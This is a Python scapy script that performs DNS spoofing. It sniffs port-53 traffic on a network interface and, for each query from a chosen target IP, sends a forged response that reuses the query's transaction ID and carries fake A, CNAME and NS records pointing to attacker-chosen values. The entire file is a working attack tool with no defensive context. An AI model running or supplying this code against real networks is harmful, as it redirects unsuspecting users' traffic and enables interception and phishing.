import argparse

from scapy.layers.dns import DNS, DNSRR, DNSQR
from scapy.layers.inet import IP, UDP
from scapy.sendrecv import sniff, send, sr, AsyncSniffer


ap = argparse.ArgumentParser()
ap.add_argument("-i", "--iface", required=False, default="eth0", type=str,
                help="Interface you wish to use")

ap.add_argument("-t", "--target", required=False, default='192.168.43.154', type=str,
                help="Ip of target server")
args = vars(ap.parse_args())


def send_False_Packet(pkt):
    if pkt[IP].src == args["target"] and pkt[DNS].qr == 0:
        demo_ans = IP(src=pkt[IP].dst, dst=pkt[IP].src) / UDP(sport=53, dport=pkt[UDP].sport) / DNS(id=pkt[DNS].id,
                                                                                                    qr=1, qdcount=1,
                                                                                                    ancount=3,
                                                                                                    qd=DNSQR(qname=pkt[
                                                                                                        DNSQR].qname),
                                                                                                    an=DNSRR(
                                                                                                        rrname=pkt[
                                                                                                            DNSQR].qname,
                                                                                                        type="A",
                                                                                                        ttl=24,
                                                                                                        rdata='1.2.3.4')/DNSRR(
                                                                                                        rrname=pkt[
                                                                                                            DNSQR].qname,
                                                                                                        type="CNAME",
                                                                                                        ttl=24,
                                                                                                        rdata="false_address.com")/DNSRR(
                                                                                                        rrname=pkt[
                                                                                                            DNSQR].qname,
                                                                                                        type="NS",
                                                                                                        ttl=24,
                                                                                                        rdata="kali.false.local"))
        send(demo_ans)
        print("sent packet")
        demo_ans.show()



try:
    print("sniffer Started")
    sniffer = sniff(iface=args["iface"], prn=send_False_Packet, filter="port 53", store=False)
    # sniffer.start()


except:
    sniffer.stop()
    print("Bye Bye")
